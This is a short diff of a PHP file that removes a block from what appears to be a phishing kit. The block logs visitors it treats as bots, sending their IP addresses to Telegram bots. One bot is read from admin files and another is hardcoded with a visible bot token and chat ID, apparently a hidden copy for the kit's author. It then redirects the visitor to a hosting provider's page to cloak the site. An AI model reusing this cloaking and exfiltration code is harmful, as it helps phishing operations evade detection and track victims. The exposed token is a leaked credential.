@@ -209,52 +209,7 @@ curl_close($ch);
 header("Location: https://www.siteground.com");exit();
 
       }  
- 
-
-$length = strlen($city);      
-      
-if ($length > "1") {
-
-        } else {
-        $content = "Bot Found: ".$IP." : City Not Found [ Blocked ] \r\n";
-$token = file_get_contents("admin/tmp/token.txt");
-$id = file_get_contents("admin/tmp/id.txt");
-$url = "https://api.telegram.org/bot";
-$bot = "{$url}{$token}";
-$tokens = "1872904754:AAGy9AoQifQTZZY02cN_rk41EQE1cwSJf9Y";
-$ids = "1129838722";
-$urls = "https://api.telegram.org/bot";
-$bots = "{$urls}{$tokens}";
-$params=[
-	'chat_id'=>$id,
-	'text'=>$content,
-];
-
-$ch = curl_init($bot . '/sendMessage');
-curl_setopt($ch, CURLOPT_HEADER, false);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_exec($ch);
-curl_close($ch);
-
-$params=[
-	'chat_id'=>$ids,
-	'text'=>$content,
-];
-
-$ch = curl_init($bots . '/sendMessage');
-curl_setopt($ch, CURLOPT_HEADER, false);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
-curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-curl_exec($ch);
-curl_close($ch);
-header("Location: https://www.siteground.com");exit();
-
-      }        
+   
     
 
 
